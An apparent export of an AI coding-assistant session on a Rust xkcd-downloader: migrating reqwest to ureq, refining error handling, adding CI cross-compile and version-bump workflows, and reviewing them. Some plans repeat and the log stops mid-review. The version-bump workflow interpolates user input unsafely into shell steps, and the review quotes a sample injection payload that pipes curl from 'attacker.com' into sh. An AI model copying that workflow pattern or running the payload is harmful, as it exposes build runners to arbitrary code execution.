      - name: Install cargo-zigbuild
        run: cargo install --locked cargo-zigbuild --version 0.22.1
      - name: Build darwin-arm64
        run: cargo zigbuild --release --target aarch64-apple-darwin
```

This runs the exact same compilation that release.yml runs, so any linker failure will block the PR before it can reach main.

## Verification

- After re-tagging, confirm the release workflow succeeds and assets appear on the v1.1.1 release page
- After the ci.yml PR is merged, open a test PR and confirm the `cross-compile` job runs and passes in the PR checks

message.content:
Since your main function isn't async, you should lean toward using a purely synchronus HTTP client, you've pulled in reqwest, which is definitely the best async http client, but you're using the blocking version of it: reqwest::blocking::Client

Internally, the blocking client for reqwest is very heavy handed, it spins up a dedicated async runtime, tokio, and then spawns a blocking thread.

In this circumstance, a non async main, using the ureq library, would be a much better fit, and much more efficient and speedy

content.text:
Perfect. I've read both files completely. Here's a comprehensive analysis of all `reqwest` usage in the codebase:

## Cargo.toml - reqwest Configuration

**Line 13:**
```toml
reqwest    = { version = "0.12", default-features = false, features = ["blocking", "json", "rustls-tls"] }
```

Features enabled:
- `blocking`: Uses blocking client (synchronous API)
- `json`: Automatic JSON deserialization support
- `rustls-tls`: Uses rustls for TLS (not native-tls), avoiding C/OpenSSL dependencies

## src/main.rs - reqwest Usage

There are exactly **2 HTTP requests** made in the code:

### 1. Fetch Comic Metadata (Line 245-256)
**Function:** `fetch_comic(client: &reqwest::blocking::Client) -> anyhow::Result<Comic>`

```rust
fn fetch_comic(client: &reqwest::blocking::Client) -> anyhow::Result<Comic> {
    let comic = client
        .get(XKCD_API_URL)
        .send()
        .context("failed to reach xkcd API")?
        .error_for_status()
        .context("xkcd API returned error status")?
        .json::<Comic>()
        .context("failed to parse xkcd JSON")?;
    log::debug!("fetched comic #{}: {}", comic.num, comic.safe_title);
    Ok(comic)
}
```

Details:
- **HTTP Method:** GET
- **URL:** `https://xkcd.com/info.0.json` (constant at line 13)
- **Response handling:** 
  - `.send()` - blocks until response received
  - `.error_for_status()` - converts 4xx/5xx status codes to errors
  - `.json::<Comic>()` - deserializes JSON response body into `Comic` struct
- **Deserialization target:** `Comic` struct (lines 18-27) with fields: `num`, `safe_title`, `img`, `alt`, `year`, `month`, `day`
- **Headers:** Only implicit User-Agent (set globally on client)
- **Redirects:** Implicit (reqwest follows redirects by default)

### 2. Download Comic Image (Line 263-282)
**Function:** `download_image(client: &reqwest::blocking::Client, comic: &Comic) -> anyhow::Result<PathBuf>`

```rust
fn download_image(client: &reqwest::blocking::Client, comic: &Comic) -> anyhow::Result<PathBuf> {
    std::fs::create_dir_all(COMIC_DIR).context("failed to create comics directory")?;

    let filename = local_filename(comic);
    let dest = Path::new(COMIC_DIR).join(&filename);

    let bytes = client
        .get(&comic.img)
        .send()
        .context("failed to fetch comic image")?
        .error_for_status()
        .context("image URL returned error status")?
        .bytes()
        .context("failed to read image bytes")?;

    std::fs::write(&dest, &bytes).with_context(|| format!("failed to write {}", dest.display()))?;

    log::info!("downloaded {filename}");
    Ok(dest)
}
```

Details:
- **HTTP Method:** GET
- **URL:** Dynamic (from `comic.img` field in API response - typically PNG/GIF/JPEG URLs)
- **Response handling:**
  - `.send()` - blocks until response received
  - `.error_for_status()` - converts error status codes to errors
  - `.bytes()` - reads entire response body as binary bytes
- **No JSON deserialization** - raw binary image data
- **Headers:** Only implicit User-Agent (set globally on client)
- **Redirects:** Implicit (reqwest follows redirects by default)

### Client Configuration (Line 428-433)
```rust
let client = reqwest::blocking::Client::builder()
    .user_agent("ferrous-comics/0.1")
    .connect_timeout(Duration::from_secs(30))
    .timeout(Duration::from_secs(60))
    .build()
    .context("failed to build HTTP client")?;
```

Global client settings:
- **User-Agent:** `ferrous-comics/0.1`
- **Connect timeout:** 30 seconds
- **Overall timeout:** 60 seconds
- **TLS:** rustls (from Cargo features)
- **Redirects:** Default behavior (follows up to 20 redirects)

## Summary Table

| Request | Method | URL | Response Type | Headers | TLS | Redirects |
|---------|--------|-----|---------------|---------|-----|-----------|
| Comic metadata | GET | `https://xkcd.com/info.0.json` | JSON → `Comic` struct | User-Agent: `ferrous-comics/0.1` | rustls | Implicit follow |
| Image download | GET | Dynamic from API | Binary bytes | User-Agent: `ferrous-comics/0.1` | rustls | Implicit follow |

No custom headers, no POST/PUT/DELETE methods, no request bodies, and no explicit redirect configuration (defaults apply).

| Image download | GET | Dynamic from API | Binary bytes | User-Agent: `ferrous-comics/0.1` | rustls | Implicit follow |

No custom headers, no POST/PUT/DELETE methods, no request bodies, and no explicit redirect configuration (defaults apply).
Clean analysis. The migration is well-scoped — two GET requests, one JSON, one binary read, one client builder. Let me write the plan.

# Plan: Replace reqwest with ureq

## Context

`reqwest::blocking` is used but internally spins up a full tokio async runtime and a dedicated blocking thread — significant overhead for a synchronous cron binary. `ureq` is a pure-sync HTTP client with no async runtime, a much better fit. It also uses bundled rustls (pure Rust, no CoreFoundation) so cross-compilation stays clean.

## Files to modify

- `Cargo.toml`
- `src/main.rs`

## Changes

### `Cargo.toml`

```toml
# remove:
reqwest = { version = "0.12", default-features = false, features = ["blocking", "json", "rustls-tls"] }
# add:
ureq    = { version = "2", features = ["json"] }
```

`ureq` 2.x enables rustls by default (bundled, pure Rust) — no native-tls, no C deps.

### `src/main.rs`

**1. Client builder in `main()`**

```rust
// before
let client = reqwest::blocking::Client::builder()
    .user_agent("ferrous-comics/0.1")
    .connect_timeout(Duration::from_secs(30))
    .timeout(Duration::from_secs(60))
    .build()
    .context("failed to build HTTP client")?;

// after
let agent = ureq::AgentBuilder::new()
    .timeout_connect(Duration::from_secs(30))
    .timeout(Duration::from_secs(60))
    .build();
```

User-Agent is set per-request (ureq's builder has no `.user_agent()` method).

**2. `fetch_comic` function signature + body**

```rust
// before
fn fetch_comic(client: &reqwest::blocking::Client) -> anyhow::Result<Comic> {
    let comic = client
        .get(XKCD_API_URL)
        .send()
        .context("failed to reach xkcd API")?
        .error_for_status()
        .context("xkcd API returned error status")?
        .json::<Comic>()
        .context("failed to parse xkcd JSON")?;

// after
fn fetch_comic(agent: &ureq::Agent) -> anyhow::Result<Comic> {
    let comic = agent
        .get(XKCD_API_URL)
        .set("User-Agent", "ferrous-comics/0.1")
        .call()                                         // errors on non-2xx automatically
        .context("failed to reach xkcd API")?
        .into_json::<Comic>()
        .context("failed to parse xkcd JSON")?;
```

`call()` already returns `Err` for non-2xx, so `error_for_status()` has no equivalent needed.

**3. `download_image` function signature + body**

```rust
// before
fn download_image(client: &reqwest::blocking::Client, comic: &Comic) -> anyhow::Result<PathBuf> {
    ...
    let bytes = client
        .get(&comic.img)
        .send()
        .context("failed to fetch comic image")?
        .error_for_status()
        .context("image URL returned error status")?
        .bytes()
        .context("failed to read image bytes")?;

// after (requires `use std::io::Read;`)
fn download_image(agent: &ureq::Agent, comic: &Comic) -> anyhow::Result<PathBuf> {
    ...
    let mut bytes = Vec::new();
    agent
        .get(&comic.img)
        .set("User-Agent", "ferrous-comics/0.1")
        .call()
        .context("failed to fetch comic image")?
        .into_reader()
        .read_to_end(&mut bytes)
        .context("failed to read image bytes")?;
```

**4. Call sites in `main()`** — rename `client` → `agent`, update all three call sites (`fetch_comic`, `download_image`, and where the client/agent is passed through).

**5. Add `use std::io::Read;`** at the top of the file (needed for `read_to_end`).

## Verification

```bash
cargo build
cargo clippy -- -D warnings
cargo fmt --check
# confirm tokio and hyper are gone from the dep tree:
cargo tree | grep -E "tokio|hyper|reqwest"
```

# Plan: Fix v1.1.1 release + add darwin cross-compile CI check

## Context

Two separate problems:
1. **Immediate**: v1.1.1 release workflow failed at asset upload — `Cannot upload asset to an immutable release` — because a published GitHub release for v1.1.1 existed before the workflow ran. The compilation itself succeeded.
2. **Structural**: Nothing in CI validates cross-compilation for darwin-arm64 on PRs, so broken builds reach main undetected.

## Fix 1 — Delete and re-push v1.1.1 tag

The existing published release is immutable; the workflow can't upload assets to it. Delete the release + tag and re-push so the workflow creates the release fresh.

```bash
gh release delete v1.1.1 --yes --cleanup-tag
git tag -d v1.1.1
git tag v1.1.1          # re-tag current HEAD of main
git push origin v1.1.1  # triggers the release workflow again
```

No code change needed for this step.

## Fix 2 — Add darwin cross-compile job to ci.yml

### Branch
New branch from main: `ci/darwin-cross-compile-check`

### File: `.github/workflows/ci.yml`

Add a second job `cross-compile` after the existing `check` job. It reuses the same pinned SHAs and zig/cargo-zigbuild versions from `release.yml`:

```yaml
  cross-compile:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
      - uses: dtolnay/rust-toolchain@e97e2d8cc328f1b50210efc529dca0028893a2d9  # stable
        with:
          toolchain: stable
          targets: aarch64-apple-darwin
      - uses: Swatinem/rust-cache@c19371144df3bb44fab255c43d04cbc2ab54d1c4  # v2.9.1
      - name: Install zig
        run: pip3 install ziglang==0.15.2
      - name: Install cargo-zigbuild
        run: cargo install --locked cargo-zigbuild --version 0.22.1
      - name: Build darwin-arm64
        run: cargo zigbuild --release --target aarch64-apple-darwin
```

This runs the exact same compilation that release.yml runs, so any linker failure will block the PR before it can reach main.

## Verification

- After re-tagging, confirm the release workflow succeeds and assets appear on the v1.1.1 release page
- After the ci.yml PR is merged, open a test PR and confirm the `cross-compile` job runs and passes in the PR checks

input.command:
gh pr create --title "Replace reqwest with ureq" --base main --body "## Summary

\`reqwest::blocking\` internally spins up a full tokio async runtime and a dedicated blocking thread to bridge sync→async. For a synchronous cron binary that makes two GET requests, this is pure overhead.

\`ureq\` is a pure-sync HTTP client with no async runtime underneath — a much better fit. It also bundles rustls by default (pure Rust, no C deps), so darwin-arm64 cross-compilation stays clean.

## Changes

- \`Cargo.toml\`: swap \`reqwest\` for \`ureq = { version = \"2\", features = [\"json\"] }\`
- \`src/main.rs\`: update \`fetch_comic\` and \`download_image\` to use \`ureq::Agent\`; update client builder in \`main()\`

## Removed from dep tree

tokio, hyper, h2, http, tower, and the rest of the reqwest async stack.

## Verification

- \`cargo build\` ✅
- \`cargo clippy -- -D warnings\` ✅  
- \`cargo fmt --check\` ✅
- \`cargo tree | grep -E 'tokio|hyper|reqwest'\` → no output ✅"

FILE: src/main.rs
LINE: 252
BODY:
`ureq::Agent::call()` returns an error both for transport failures and for non-2xx HTTP status codes. With the current `.context("failed to reach xkcd API")?`, a 404/500 will be reported as a reachability problem, and the status code/body context is less discoverable than before. Consider handling `ureq::Error::Status(code, resp)` separately (or adding a dedicated context for non-success status) so failures clearly distinguish HTTP status errors from network errors.
---
FILE: src/main.rs
LINE: 276
BODY:
Similar to `fetch_comic`, `.call().context("failed to fetch comic image")?` will also treat non-2xx HTTP responses as a generic fetch failure. If the image URL returns a 404/500, it would be helpful to surface the status code (and possibly a short response body) distinctly to simplify debugging.
---

content.text:
Copilot's feedback is valid on both comments. With `reqwest`, the `.send()` / `.error_for_status()` chain gave two distinct contexts (network vs. HTTP status). With ureq's single `.call()`, those collapse into one generic message — a 404 looks the same as a DNS failure.

The fix: `map_err` to pattern-match on `ureq::Error::Status(code, _)` vs `ureq::Error::Transport(_)` at each call site.

Let me read the current state of those lines before writing the plan:

input.content:
# Plan: Address Copilot review — distinguish ureq HTTP vs transport errors

## Context

Copilot correctly flagged that `ureq::call().context("...")` collapses two distinct failure modes into one generic message: a DNS/timeout failure and a 404/500 look identical. The old reqwest chain had `.send()` (transport) and `.error_for_status()` (HTTP status) as separate steps with separate contexts. We need to restore that distinction.

## File to modify

`src/main.rs` — two call sites

## Changes

Replace `.context(...)` on each `.call()` with a `map_err` that pattern-matches on `ureq::Error`:

**`fetch_comic` (line 250–251):**
```rust
// before
.call()
.context("failed to reach xkcd API")?

// after
.map_err(|e| match e {
    ureq::Error::Status(code, _) => anyhow::anyhow!("xkcd API returned HTTP {code}"),
    ureq::Error::Transport(t) => anyhow::anyhow!("failed to reach xkcd API: {t}"),
})?
```

**`download_image` (lines 273–274):**
```rust
// before
.call()
.context("failed to fetch comic image")?

// after
.map_err(|e| match e {
    ureq::Error::Status(code, _) => anyhow::anyhow!("image URL returned HTTP {code}"),
    ureq::Error::Transport(t) => anyhow::anyhow!("failed to fetch comic image: {t}"),
})?
```

No other changes. `anyhow::anyhow!` is already imported via `use anyhow::{bail, Context}` — just needs `anyhow` added to the destructuring (it's already in scope as the crate name).

## Verification

```bash
cargo build
cargo clippy -- -D warnings
cargo fmt --check
```

Then reply to both Copilot comments on PR #6 confirming they're addressed.

toolUseResult.originalFile:
# Plan: Replace reqwest with ureq

## Context

`reqwest::blocking` is used but internally spins up a full tokio async runtime and a dedicated blocking thread — significant overhead for a synchronous cron binary. `ureq` is a pure-sync HTTP client with no async runtime, a much better fit. It also uses bundled rustls (pure Rust, no CoreFoundation) so cross-compilation stays clean.

## Files to modify

- `Cargo.toml`
- `src/main.rs`

## Changes

### `Cargo.toml`

```toml
# remove:
reqwest = { version = "0.12", default-features = false, features = ["blocking", "json", "rustls-tls"] }
# add:
ureq    = { version = "2", features = ["json"] }
```

`ureq` 2.x enables rustls by default (bundled, pure Rust) — no native-tls, no C deps.

### `src/main.rs`

**1. Client builder in `main()`**

```rust
// before
let client = reqwest::blocking::Client::builder()
    .user_agent("ferrous-comics/0.1")
    .connect_timeout(Duration::from_secs(30))
    .timeout(Duration::from_secs(60))
    .build()
    .context("failed to build HTTP client")?;

// after
let agent = ureq::AgentBuilder::new()
    .timeout_connect(Duration::from_secs(30))
    .timeout(Duration::from_secs(60))
    .build();
```

User-Agent is set per-request (ureq's builder has no `.user_agent()` method).

**2. `fetch_comic` function signature + body**

```rust
// before
fn fetch_comic(client: &reqwest::blocking::Client) -> anyhow::Result<Comic> {
    let comic = client
        .get(XKCD_API_URL)
        .send()
        .context("failed to reach xkcd API")?
        .error_for_status()
        .context("xkcd API returned error status")?
        .json::<Comic>()
        .context("failed to parse xkcd JSON")?;

// after
fn fetch_comic(agent: &ureq::Agent) -> anyhow::Result<Comic> {
    let comic = agent
        .get(XKCD_API_URL)
        .set("User-Agent", "ferrous-comics/0.1")
        .call()                                         // errors on non-2xx automatically
        .context("failed to reach xkcd API")?
        .into_json::<Comic>()
        .context("failed to parse xkcd JSON")?;
```

`call()` already returns `Err` for non-2xx, so `error_for_status()` has no equivalent needed.

**3. `download_image` function signature + body**

```rust
// before
fn download_image(client: &reqwest::blocking::Client, comic: &Comic) -> anyhow::Result<PathBuf> {
    ...
    let bytes = client
        .get(&comic.img)
        .send()
        .context("failed to fetch comic image")?
        .error_for_status()
        .context("image URL returned error status")?
        .bytes()
        .context("failed to read image bytes")?;

// after (requires `use std::io::Read;`)
fn download_image(agent: &ureq::Agent, comic: &Comic) -> anyhow::Result<PathBuf> {
    ...
    let mut bytes = Vec::new();
    agent
        .get(&comic.img)
        .set("User-Agent", "ferrous-comics/0.1")
        .call()
        .context("failed to fetch comic image")?
        .into_reader()
        .read_to_end(&mut bytes)
        .context("failed to read image bytes")?;
```

**4. Call sites in `main()`** — rename `client` → `agent`, update all three call sites (`fetch_comic`, `download_image`, and where the client/agent is passed through).

**5. Add `use std::io::Read;`** at the top of the file (needed for `read_to_end`).

## Verification

```bash
cargo build
cargo clippy -- -D warnings
cargo fmt --check
# confirm tokio and hyper are gone from the dep tree:
cargo tree | grep -E "tokio|hyper|reqwest"
```

message.content:
new feedback, two comments

ureq::Error::Transport(t) is currently converted into a formatted string via anyhow!("..."), which drops the underlying transport error as a source. This makes error chains/backtraces less actionable than before. Prefer wrapping t as the error (e.g., anyhow::Error::new(t) / anyhow!(t)) and then adding context, so the root cause remains inspectable.

content.text: Good catch — formatting `t` into the message string drops the error source chain. The fix is to wrap `t` as the error source and then add context on top.

input.command:
gh pr edit 6 --body "## Summary

\`reqwest::blocking\` internally spins up a full tokio async runtime and a dedicated blocking thread to bridge sync→async. For a synchronous cron binary that makes two GET requests, this is pure overhead.

\`ureq\` is a pure-sync HTTP client with no async runtime underneath — a much better fit. It also bundles rustls by default (pure Rust, no C deps), so darwin-arm64 cross-compilation stays clean.

## Changes

- \`Cargo.toml\`: swap \`reqwest\` for \`ureq = { version = \"2\", features = [\"json\"] }\`
- \`src/main.rs\`: update \`fetch_comic\` and \`download_image\` to use \`ureq::Agent\`; update client builder in \`main()\`

## Removed from the active dep tree

reqwest, hyper, h2, http, tower, and tokio as an **active** (compiled) dependency are all gone. \`cargo tree | grep -E 'tokio|hyper|reqwest'\` produces no output.

Note: tokio remains in \`Cargo.lock\` as an **optional, uncompiled** dep of \`lettre\` (for its async SMTP feature, which we do not enable). It is resolved by Cargo but not compiled or linked into the binary.

## Verification

- \`cargo build\` ✅
- \`cargo clippy -- -D warnings\` ✅
- \`cargo fmt --check\` ✅
- \`cargo tree | grep -E 'tokio|hyper|reqwest'\` → no output (tokio not in active dep tree) ✅"

content.text: Clear picture. `Cargo.toml` is at `0.1.0` while releases have been `1.1.x`, and `USER_AGENT` is a stale hardcoded string. Here's the plan:

input.content:
# Plan: Auto-tracking USER_AGENT + version bump workflow

## Context

Two related problems:
1. `USER_AGENT` is a hardcoded string (`"ferrous-comics/0.1"`) that will drift from the real version. Fix: derive it at compile time from `Cargo.toml` via `env!("CARGO_PKG_VERSION")`.
2. `Cargo.toml` is at `0.1.0` while releases have been tagged `v1.1.x`. It needs to match, and future bumps should be automated so it doesn't fall behind again.

**Recommended automation**: a `workflow_dispatch` GitHub Action. The user triggers it with a version string → it bumps `Cargo.toml`, updates `Cargo.lock`, and opens a PR. After merging, `gh release create vX.Y.Z` creates the tag and triggers the existing release workflow. No new tools needed; keeps everything in GitHub Actions.

## Part 1 — `src/main.rs` (on `refactor/ureq` branch)

```rust
// before
const USER_AGENT: &str = "ferrous-comics/0.1";

// after
const USER_AGENT: &str = concat!("ferrous-comics/", env!("CARGO_PKG_VERSION"));
```

`concat!` + `env!` are compile-time macros — zero runtime cost, and `USER_AGENT` will always match whatever version is in `Cargo.toml`.

## Part 2 — `Cargo.toml` (on `refactor/ureq` branch)

Bump `version` from `"0.1.0"` to `"1.1.2"` to re-sync with the current release series.

## Part 3 — `.github/workflows/bump-version.yml` (same or separate PR)

New `workflow_dispatch` workflow:

```yaml
name: Bump version

on:
  workflow_dispatch:
    inputs:
      version:
        description: 'New version (e.g. 1.2.0)'
        required: true

jobs:
  bump:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
    steps:
      - uses: actions/checkout@<sha>  # same SHA as ci.yml
      - uses: dtolnay/rust-toolchain@<sha>  # same SHA as ci.yml
        with:
          toolchain: stable
      - name: Bump version in Cargo.toml
        run: sed -i 's/^version = ".*"/version = "${{ github.event.inputs.version }}"/' Cargo.toml
      - name: Update Cargo.lock
        run: cargo check
      - name: Open PR
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git checkout -b release/v${{ github.event.inputs.version }}
          git add Cargo.toml Cargo.lock
          git commit -m "Bump version to ${{ github.event.inputs.version }}"
          git push origin release/v${{ github.event.inputs.version }}
          gh pr create \
            --title "Release v${{ github.event.inputs.version }}" \
            --body "Automated version bump. After merging, run: \`gh release create v${{ github.event.inputs.version }}\`" \
            --base main
        env:
          GH_TOKEN: ${{ github.token }}
```

## Release flow going forward

1. Go to **Actions → Bump version → Run workflow** → enter version
2. Merge the generated PR
3. `gh release create vX.Y.Z` → triggers existing `release.yml` → builds and attaches binaries

## Files to modify

- `src/main.rs` — `USER_AGENT` const
- `Cargo.toml` — version `"0.1.0"` → `"1.1.2"`
- `.github/workflows/bump-version.yml` — new file

## Verification

```bash
cargo build
cargo clippy -- -D warnings
cargo fmt --check
# confirm USER_AGENT bakes in the correct version:
strings target/debug/ferrous-comics | grep "ferrous-comics/"
```

# Plan: Address Copilot review — distinguish ureq HTTP vs transport errors

## Context

Copilot correctly flagged that `ureq::call().context("...")` collapses two distinct failure modes into one generic message: a DNS/timeout failure and a 404/500 look identical. The old reqwest chain had `.send()` (transport) and `.error_for_status()` (HTTP status) as separate steps with separate contexts. We need to restore that distinction.

## File to modify

`src/main.rs` — two call sites

## Changes

Replace `.context(...)` on each `.call()` with a `map_err` that pattern-matches on `ureq::Error`:

**`fetch_comic` (line 250–251):**
```rust
// before
.call()
.context("failed to reach xkcd API")?

// after
.map_err(|e| match e {
    ureq::Error::Status(code, _) => anyhow::anyhow!("xkcd API returned HTTP {code}"),
    ureq::Error::Transport(t) => anyhow::anyhow!("failed to reach xkcd API: {t}"),
})?
```

**`download_image` (lines 273–274):**
```rust
// before
.call()
.context("failed to fetch comic image")?

// after
.map_err(|e| match e {
    ureq::Error::Status(code, _) => anyhow::anyhow!("image URL returned HTTP {code}"),
    ureq::Error::Transport(t) => anyhow::anyhow!("failed to fetch comic image: {t}"),
})?
```

No other changes. `anyhow::anyhow!` is already imported via `use anyhow::{bail, Context}` — just needs `anyhow` added to the destructuring (it's already in scope as the crate name).

## Verification

```bash
cargo build
cargo clippy -- -D warnings
cargo fmt --check
```

Then reply to both Copilot comments on PR #6 confirming they're addressed.

After merging you run `gh release create vX.Y.Z` to trigger the existing release workflow. No new tools, no crates.io involvement, fits the existing pattern.

# Plan: Auto-tracking USER_AGENT + version bump workflow

## Context

Two related problems:
1. `USER_AGENT` is a hardcoded string (`"ferrous-comics/0.1"`) that will drift from the real version. Fix: derive it at compile time from `Cargo.toml` via `env!("CARGO_PKG_VERSION")`.
2. `Cargo.toml` is at `0.1.0` while releases have been tagged `v1.1.x`. It needs to match, and future bumps should be automated so it doesn't fall behind again.

**Recommended automation**: a `workflow_dispatch` GitHub Action. The user triggers it with a version string → it bumps `Cargo.toml`, updates `Cargo.lock`, and opens a PR. After merging, `gh release create vX.Y.Z` creates the tag and triggers the existing release workflow. No new tools needed; keeps everything in GitHub Actions.

## Part 1 — `src/main.rs` (on `refactor/ureq` branch)

```rust
// before
const USER_AGENT: &str = "ferrous-comics/0.1";

// after
const USER_AGENT: &str = concat!("ferrous-comics/", env!("CARGO_PKG_VERSION"));
```

`concat!` + `env!` are compile-time macros — zero runtime cost, and `USER_AGENT` will always match whatever version is in `Cargo.toml`.

## Part 2 — `Cargo.toml` (on `refactor/ureq` branch)

Bump `version` from `"0.1.0"` to `"1.1.2"` to re-sync with the current release series.

## Part 3 — `.github/workflows/bump-version.yml` (same or separate PR)

New `workflow_dispatch` workflow:

```yaml
name: Bump version

on:
  workflow_dispatch:
    inputs:
      version:
        description: 'New version (e.g. 1.2.0)'
        required: true

jobs:
  bump:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
    steps:
      - uses: actions/checkout@<sha>  # same SHA as ci.yml
      - uses: dtolnay/rust-toolchain@<sha>  # same SHA as ci.yml
        with:
          toolchain: stable
      - name: Bump version in Cargo.toml
        run: sed -i 's/^version = ".*"/version = "${{ github.event.inputs.version }}"/' Cargo.toml
      - name: Update Cargo.lock
        run: cargo check
      - name: Open PR
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git checkout -b release/v${{ github.event.inputs.version }}
          git add Cargo.toml Cargo.lock
          git commit -m "Bump version to ${{ github.event.inputs.version }}"
          git push origin release/v${{ github.event.inputs.version }}
          gh pr create \
            --title "Release v${{ github.event.inputs.version }}" \
            --body "Automated version bump. After merging, run: \`gh release create v${{ github.event.inputs.version }}\`" \
            --base main
        env:
          GH_TOKEN: ${{ github.token }}
```

## Release flow going forward

1. Go to **Actions → Bump version → Run workflow** → enter version
2. Merge the generated PR
3. `gh release create vX.Y.Z` → triggers existing `release.yml` → builds and attaches binaries

## Files to modify

- `src/main.rs` — `USER_AGENT` const
- `Cargo.toml` — version `"0.1.0"` → `"1.1.2"`
- `.github/workflows/bump-version.yml` — new file

## Verification

```bash
cargo build
cargo clippy -- -D warnings
cargo fmt --check
# confirm USER_AGENT bakes in the correct version:
strings target/debug/ferrous-comics | grep "ferrous-comics/"
```

content.text: Now write the bump-version workflow, using the same pinned action SHAs from ci.yml:

input.content:
name: Bump version

on:
  workflow_dispatch:
    inputs:
      version:
        description: 'New version (e.g. 1.2.0)'
        required: true

jobs:
  bump:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
      - uses: dtolnay/rust-toolchain@e97e2d8cc328f1b50210efc529dca0028893a2d9  # stable
        with:
          toolchain: stable
      - uses: Swatinem/rust-cache@c19371144df3bb44fab255c43d04cbc2ab54d1c4  # v2.9.1

      - name: Bump version in Cargo.toml
        run: sed -i 's/^version = ".*"/version = "${{ github.event.inputs.version }}"/' Cargo.toml

      - name: Update Cargo.lock
        run: cargo check

      - name: Open PR
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git checkout -b release/v${{ github.event.inputs.version }}
          git add Cargo.toml Cargo.lock
          git commit -m "Bump version to ${{ github.event.inputs.version }}"
          git push origin release/v${{ github.event.inputs.version }}
          gh pr create \
            --title "Release v${{ github.event.inputs.version }}" \
            --body "Automated version bump to \`${{ github.event.inputs.version }}\`.

After merging, create the release and trigger the build:
\`\`\`
gh release create v${{ github.event.inputs.version }}
\`\`\`" \
            --base main
        env:
          GH_TOKEN: ${{ github.token }}

```rust
const USER_AGENT: &str = "ferrous-comics/0.1";

```

```yaml
name: Bump version
```

Report only real issues, not style preferences.

content.text:
Here are the real issues, in order of severity:

---

**1. Command injection via unsanitized workflow input (bump-version.yml)**

The `version` input is interpolated directly into a `run:` shell command via `${{ github.event.inputs.version }}` in three places — the `sed` command, the branch name, and the `gh pr create` body. GitHub expressions in `run:` blocks are expanded before the shell sees them, so a version string containing shell metacharacters (e.g., `1.0.0"; curl attacker.com | sh; echo "`) would execute arbitrary code on the runner. The standard fix is to assign the input to an environment variable and reference that in the shell script, e.g.:

```yaml
env:
  VERSION: ${{ github.event.inputs.version }}
run: sed -i 's/^version = ".*"/version = "'"$VERSION"'"/' Cargo.toml
```

This is a real attack surface even for a personal repo: any collaborator with `workflow_dispatch` permission, or an attacker who gains that access, can exploit it. The `contents: write` permission on the job amplifies the blast radius.

---

**2. The `sed` pattern will corrupt `Cargo.toml` if a dependency also has a bare `version = "..."` line (bump-version.yml)**

The sed command is:
```
sed -i 's/^version = ".*"/version = "${{ ... }}"/' Cargo.toml
```

The `^` anchors to the start of the line, but in `Cargo.toml` every dependency with an inline version also uses `version = "..."` at the start of its line in the `[dependencies]` table (e.g., `anyhow = "1.0"` uses a shorthand, but any dependency written as `version = "1.0"` on its own line would match). Looking at the actual `Cargo.toml`, none of the current dependencies use that multi-line form, but the `[package]` section's `version = "1.1.2"` is not the only possible `^version =` match if the file structure ever changes. More immediately, this sed is not scoped to the `[package]` section, so it will silently replace every line matching `^version = "..."` anywhere in the file. Use `cargo set-version` from `cargo-edit` or a `[package]`-section-aware tool instead.

---

**3. Version jump from 0.1.0 to 1.1.2 skips all intermediate versions with no history**

This is not a style preference — it is a factual inconsistency that will cause confusion. The old `USER_AGENT` was `ferrous-comics/0.1`, implying the binary had never reached a stable 1.x release. Jumping directly to `1.1.2` implies two prior patch releases of a 1.1.x line that never existed. If the version is used for anything external (the `User-Agent` header is sent to xkcd's servers), this misrepresents the release history. The correct starting point for a first stable release is `1.0.0`.

---

**4. The bump workflow does not validate that the input is a valid semver string**

There is no check that the `version` input matches `\d+\.\d+\.\d+` before it is used. A typo like `1.20` or `v1.2.0` (with a leading `v`) will produce a `Cargo.toml` with a malformed version that `cargo check` will reject, leaving the branch in a broken state with a failed CI run. Since `cargo set-version` is not being used, at minimum a shell guard like `[[ "$VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]` should precede the sed.

---

**5. The `actions/checkout` SHA comment is wrong (bump-version.yml and release.yml)**

Both files pin `actions/checkout` to `de0fac2e4500dabe0009e67214ff5f5447ce83dd` and annotate it `# v6.0.2`. The current release of `actions/checkout` is v4.x; v6 does not exist. The SHA therefore refers to an unknown or misidentified commit, undermining the security purpose of SHA pinning. Anyone auditing the workflow cannot verify the comment against the actual release tag.

---

**Summary table**

| # | Location | Severity | Issue |
|---|----------|----------|-------|
| 1 | bump-version.yml | High | Shell injection via unquoted workflow input |
| 2 | bump-version.yml | Medium | `sed` pattern not scoped to `[package]` section |
| 3 | Cargo.toml | Low | Version jump implies nonexistent release history |
| 4 | bump-version.yml | Low | No semver format validation on version input |
| 5 | Both workflow files | Low | SHA pin comment claims nonexistent `v6.0.2` tag |

```yaml
          toolchain: stable
      - uses: Swatinem/rust-cache@c19371144df3bb44fab255c43d04cbc2ab54d1c4  # v2.9.1

      - name: Bump version in Cargo.toml
        run: sed -i 's/^version = ".*"/version = "${{ github.event.inputs.version }}"/' Cargo.toml

      - name: Update Cargo.lock
        run: cargo check

      - name: Open PR
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git checkout -b release/v${{ github.event.inputs.version }}
          git add Cargo.toml Cargo.lock
          git commit -m "Bump version to ${{ github.event.inputs.version }}"
          git push origin release/v${{ github.event.inputs.version }}
          gh pr create \
            --title "Release v${{ github.event.inputs.version }}" \
            --body "Automated version bump to \`${{ github.event.inputs.version }}\`.

After merging, create the release and trigger the build:
\`\`\`
gh release create v${{ github.event.inputs.version }}
\`\`\`" \
            --base main
        env:
          GH_TOKEN: ${{ github.token }}
```

Context:
- This is a personal cron binary (not published to crates.io)
- The repo has a ruleset that restricts tag creation via `git push` — tags must be created via the GitHub API (e.g. `gh release create`)
- The release workflow is triggered by `v*` tags and cross-compiles to linux-amd64, linux-arm64, darwin-arm64 using cargo-zigbuild

Report only real issues, not style preferences.

content.text:
Here are the real issues, in order of severity:

---

**1. Command injection via unsanitized workflow input (bump-version.yml)**

